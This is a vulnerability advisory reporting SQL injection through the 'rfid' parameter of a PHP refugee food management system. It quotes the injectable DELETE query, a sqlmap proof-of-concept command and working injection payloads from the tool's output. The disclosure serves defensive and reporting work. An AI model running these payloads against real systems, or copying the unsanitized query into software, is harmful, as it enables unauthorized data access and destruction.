# SQLi in code-projects Refugee Food Management System 1.0 of file /home/pagenateRefugeesList.php

**vender**:

- https://code-projects.org/refugee-food-management-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/491fdab9-7421-418b-93a2-bb506ba9cf02

**Vulnerable File**

- /home/pagenateRefugeesList.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/pagenateRefugeesList.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

Line 81-82

**injection point: `$_GET['rfid']`**

```php
if (isset($_GET['rfid'])){
		$Id = $_GET['rfid'];
		if (mysql_query("DELETE FROM refugee WHERE rfid = '$Id'"))
			echo "<p><span style='font-weight:bold; color:#FF0000; margin-left:150px;'>refugee Details successfully deleted</span></p>";				
		else
			echo "<p><span style='font-weight:bold; color:#FF0000; margin-left:150px;'>Error deleting a patient Detail ".mysql_error()."</span></p>";
	}

?> 	
```

### POC

```bash
sqlmap -u "http://192.168.93.1/Refugee/home/pagenateRefugeesList.php?rfid=1" --cookie="PHPSESSID=b18e5od9eis7dbshtjrca24fs0" --dbms=mysql --level=2 --thread=10 --batch
```

```
---
Parameter: rfid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: rfid=1' AND 6320=(SELECT (CASE WHEN (6320=6320) THEN 6320 ELSE (SELECT 1415 UNION SELECT 1846) END))-- -

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: rfid=1' AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT (ELT(3676=3676,1))),0x716b767871),3676) AND 'Wflp'='Wflp

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: rfid=1' AND 7097=BENCHMARK(5000000,MD5(0x434a4453)) AND 'Mvfi'='Mvfi
---
```

![image-20251224163834649](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512241638751.png)